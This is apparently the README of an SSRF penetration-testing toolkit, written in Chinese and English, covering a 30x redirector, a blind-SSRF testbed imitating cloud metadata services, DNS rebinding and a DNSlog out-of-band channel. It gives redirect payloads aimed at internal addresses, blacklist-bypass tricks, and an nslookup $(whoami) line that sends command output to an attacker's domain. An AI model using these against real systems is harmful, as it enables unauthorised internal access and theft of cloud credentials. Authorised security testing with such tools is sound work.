# SSRF 测试平台 · SSRF 30x Redirector

> **SSRF 测试工具** | **盲 SSRF 检测** | **30x 重定向跳板** | **DNS Rebinding** | **DNSlog 带外信道** — 单文件 Flask 实现，`pip install flask` 即可运行。

**SSRF (Server-Side Request Forgery) 利用与验证平台**，面向 **渗透测试**、**红队**、**内网渗透**、**云安全评估**。集成 **30x 重定向跳板**、**盲 SSRF 自检靶场**、**DNS 重绑定 (DNS Rebinding)**、**DNSlog 带外 (OOB) 信道** 四大模块，用于探测 **SSRF 漏洞**、验证 **云元数据 (AWS IMDSv2 / GCP Metadata / Azure IMDS)** 访问能力、构造 **多跳重定向链**、绕过 **SSRF 黑名单与 WAF**。

**English**: A single-file Flask toolkit for **SSRF testing** — **30x redirector**, **blind SSRF testbed**, **DNS rebinding**, and **DNSlog out-of-band** channel. Built for **penetration testing**, **red teaming**, **internal network probing**, and **cloud metadata (IMDSv2 / GCP / Azure) security assessment**.

---

## 核心能力一览

| 模块 | 用途 | 相关关键词 |
|---|---|---|
| **30x 重定向引擎** | 单跳 / 多跳 / 有状态链跳转，把目标服务器带向内网地址 | `SSRF` `Open Redirect` `HTTP 跳转` `Redirector` `内网探测` |
| **盲 SSRF 靶场** | 自建测试端点，先本地验证 payload 再打真实目标 | `Blind SSRF` `盲打` `云元数据` `IMDSv2` `GCP Metadata` |
| **DNS Rebinding** | 利用 TOCTOU 时间差把公网 IP 切换到内网 | `DNS 重绑定` `TOCTOU` `SSRF 绕过` `黑名单绕过` |
| **DNSlog 带外** | 无回显场景下确认漏洞是否被触发 | `DNSlog` `OOB` `Out-of-Band` `无回显验证` `命令注入` |

---

## 为什么选它

- **SSRF 黑名单绕过**：内置 **十进制 IP**、**十六进制 IP**、**IPv6 环回**、`localtest.me`、**URL userinfo 混淆** 五类 payload 构造法。
- **盲 SSRF 不再靠猜**：内置 **盲 SSRF 靶场**，先在本地确认 payload 有效，再对真实目标使用。
- **云元数据攻击验证**：预置 **AWS IMDSv1/v2**、**GCP Metadata**、**Azure IMDS**、**阿里云 / 腾讯云元数据** 模拟端点，可验证请求头是否正确透传。
- **只跟一跳的困境**：**有状态重定向链** 逐跳推进并记录日志，能确认目标究竟跟到了第几跳。
- **HEAD 探测被拦**：**HEAD 伪装** 返回 `200` + 假 `Content-Length: 8192`，让目标"确信"内网目标存在。
- **不确定目标是否跟随 30x**：`combo` 降级模式同时下发 **30x + Refresh 头 + meta refresh + JS location.replace**。
- **DNS 层被拦或黑名单严格**：用 **DNS Rebinding** 绕过基于解析结果校验的防御逻辑。

---

## 快速开始

```bash
pip install flask markupsafe      # 必需
pip install cryptography          # 可选：自动生成 HTTPS 自签证书

python SSRF_30x_Redirector_v2.9_DNSlog.py
```

首次启动进入向导（端口 / HTTPS / 访问令牌），随后打印**随机控制台路径**：

```
🎯 控制台: http://<your-ip>:5000/a3f9c2e1b8d7f0a9   ← 每次启动重新生成
```

**管理 UI 与全部管理 API 都挂在这条 16 位随机 hex 路径下，根路径完整让渡给攻击链。**

---

## 模块一：30x 重定向跳板

```bash
# 单跳重定向
GET /r?url=http://127.0.0.1:8080/admin          → 302 Location: ...

# 无状态链（参数全在 URL，可水平扩容 / 重启不丢）
GET /c?chain=http://a.com|http://10.0.0.1/x

# 有状态链（服务端记录进度，根路径即链 ID）
POST /<console>/api/stateful_chains/create
{"stages":[{"url":"http://pub.com","code":302},
           {"url":"http://10.0.0.1/admin","code":307}],
 "head_bypass": true}
```

- **支持状态码**：`300` `301` `302` `303` `307` `308`（刻意剔除 304 / 305 / 306，无重定向语义）
- **支持方法**：`GET` `POST` `PUT` `DELETE` `PATCH` `TRACE` `OPTIONS` `HEAD` `CONNECT`
- **响应降级模式**：`30x` / `refresh` / `meta` / `js` / `combo`
- **队列模式**：一条链轮流返回多个目标，适合批量探内网段
- **命中分析**：聚合统计每条链被访问次数、来源 IP、最后到达的跳数

---

## 模块二：盲 SSRF 自检靶场 `/bb/*`

| 端点 | 模拟目标 | 关键约束 |
|---|---|---|
| `/bb/aws/imds` | **AWS IMDSv1** | 无鉴权 |
| `/bb/aws/token` | **AWS IMDSv2** | **返回 401**，必须先用 `PUT` 取 Token |
| `/bb/gcp/meta` | **GCP Metadata** | **必须带 `Metadata-Flavor: Google`** |
| `/bb/azure/imds` | **Azure IMDS** | **必须带 `Metadata: true`** |
| `/bb/aliyun` `/bb/tencent` | **阿里云 / 腾讯云元数据** | 无鉴权 |
| `/bb/200` `204` `400` `401` `403` `404` `500` `502` | 状态码矩阵 | — |
| `/bb/delay3s` `/bb/timeout` | 延迟 3s / 30s | 测客户端超时 |

**模板占位符**：`{{TIME}}` `{{UUID}}` `{{IP}}` `{{UA}}` `{{METHOD}}` `{{PATH}}` `{{HOST}}` `{{SELF}}` `{{REQ_JSON}}` `{{PAD:n}}`

支持自定义端点、二进制响应体（base64）、`require_headers` 请求头校验、`etag_304` 协商缓存、命中计数。

**典型用法（先自检，再实战）**：

```bash
# 1. 本地验证 payload 是否正确携带必需请求头
curl http://your-server:5000/bb/gcp/meta
→ 401：说明请求头没带对

curl -H "Metadata-Flavor: Google" http://your-server:5000/bb/gcp/meta
→ 200：payload 正确，可以放心打真实目标
```

---

## 模块三：DNS Rebinding（TOCTOU 绕过）

**原理**：目标先解析域名做安全检查（返回合法公网 IP `1.2.3.4` 通过校验），实际发起连接时再次解析，此时应答已切换为 `127.0.0.1`。

```
首次查询 → 1.2.3.4   （任何"是否内网"的黑名单都放行）
达到阈值后 → 127.0.0.1 （卡在"校验后、连接前"的时间窗口）
```

**触发方式**：按**查询次数**（第 N 次查询起切换）或按**时间**（超短 TTL + 定时切换）。

---

## 模块四：DNSlog 带外信道（OOB）

```bash
# 启动 DNS 服务（默认 UDP 53531）
GET  /<console>/api/dnslog/start?port=53531

# 生成 Token
GET  /<console>/api/dnslog/token/new     → {"token":"a1b2c3d4..."}

# 植入 payload
http://your-target/?file=http://a1b2c3d4.your-domain.com/

# 拉取记录
GET  /<console>/api/dnslog/records
```

**记录字段**：Token / 子域名 / 完整查询名 / 客户端 IP / 客户端端口 / 北京时间

**对所有查询恒返回 `NXDOMAIN`**（`flags=0x8183`）—— 只做记录，不提供真实解析，不会被用作 **DNS 放大攻击**载体。

---

## 适用场景

- **SSRF 漏洞验证**：确认目标是否真的发出了第二个请求
- **盲 SSRF 探测**：无回显时靠 DNSlog / 时间延迟 / 状态码差异判断
- **云主机元数据攻击**：**AWS IMDSv2** Token 流程、**GCP / Azure / 阿里云 / 腾讯云** 元数据接口测试
- **WAF / 黑名单绕过**：多跳链让 WAF 看不到后续跳转，IP 变形绕过字符串黑名单
- **内网端口与服务探测**：队列模式批量轮询内网地址，按响应码与延迟判断存活
- **无回显 RCE 外带**：命令注入配合 DNSlog 确认执行，`nslookup $(whoami).<token>.your-domain.com`
- **SSRF 防御有效性评估**：用 DNS Rebinding 检验目标是否存在 **TOCTOU** 缺陷

---

## 部署

```bash
# Docker
docker run -d -p 5000:5000 -p 53531:53531/udp ssrf-redirector

# VPS
nohup python3 SSRF_30x_Redirector_v2.9_DNSlog.py &
ufw allow 5000/tcp && ufw allow 53531/udp

# 公网域名（DNSlog / Rebinding 必需泛解析）
A  *         <你的服务器 IP>
A  ns        <你的服务器 IP>
NS dnslog    ns.yourdomain.com
```

---

## 安全与合规

**仅限授权测试场景**：企业自查、授权渗透项目、自有环境研究。**严禁用于未授权攻击**。

内置自保措施：控制台路径每次启动随机化、DNSlog 恒返回 NXDOMAIN、可选 `X-Access-Token` 鉴权、日志环形缓冲上限 1000 条。

MIT License · 使用本工具产生的一切后果由使用者承担。

---

<!-- ===== 搜索关键词区块（GitHub / 搜索引擎索引） ===== -->

## 关键词 / Keywords

**中文**：SSRF 测试工具 · SSRF 漏洞利用 · 盲 SSRF 检测 · SSRF 靶场 · SSRF 绕过 · 30x 重定向 · HTTP 跳转跳板 · 重定向器 Redirector · 有状态重定向链 · 多跳跳转 · 云元数据攻击 · 元数据服务 · AWS IMDSv2 绕过 · GCP Metadata · Azure IMDS · 阿里云元数据 · 腾讯云元数据 · DNS 重绑定 · DNS Rebinding · TOCTOU 绕过 · DNSlog · 带外信道 OOB · 无回显验证 · 命令注入外带 · 内网渗透 · 内网端口探测 · 渗透测试工具 · 红队工具 · 安全测试平台 · Web 安全 · 漏洞验证 · Flask 安全工具 · Python 渗透工具

**English**: SSRF testing tool · SSRF exploitation · blind SSRF detection · SSRF bypass · SSRF payload generator · SSRF testbed · 30x redirector · HTTP redirect · open redirect · stateful redirect chain · multi-hop redirect · cloud metadata attack · metadata service · AWS IMDSv2 bypass · IMDSv1 · GCP metadata server · Azure IMDS · Alibaba Cloud metadata · DNS rebinding · TOCTOU bypass · DNSlog · out-of-band OOB · blind vulnerability verification · command injection exfiltration · internal network probing · port scanning · penetration testing toolkit · red team tooling · web security · Flask security tool · Python pentest

---

## 仓库 Topics（请同步填写到 GitHub 仓库 About）

```
ssrf  blind-ssrf  ssrf-bypass  ssrf-payload  redirector  http-redirect
open-redirect  dns-rebinding  dnslog  oob  out-of-band  toctou
imds  imdsv2  aws-imds  gcp-metadata  azure-imds  cloud-metadata
metadata-service  penetration-testing  pentest  red-team  security-tools
web-security  vulnerability-scanner  flask  python  internal-network
```
